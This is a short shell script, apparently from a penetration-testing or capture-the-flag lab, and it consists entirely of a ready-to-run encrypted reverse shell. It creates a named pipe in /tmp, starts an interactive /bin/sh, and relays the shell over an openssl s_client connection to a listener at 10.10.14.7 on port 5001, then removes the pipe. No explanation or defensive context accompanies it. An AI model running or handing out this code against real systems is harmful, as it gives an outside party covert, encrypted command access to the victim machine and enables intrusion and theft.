#!/bin/sh
HOST="10.10.14.7"
PORT=5001
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $HOST:$PORT > /tmp/s; rm /tmp/s
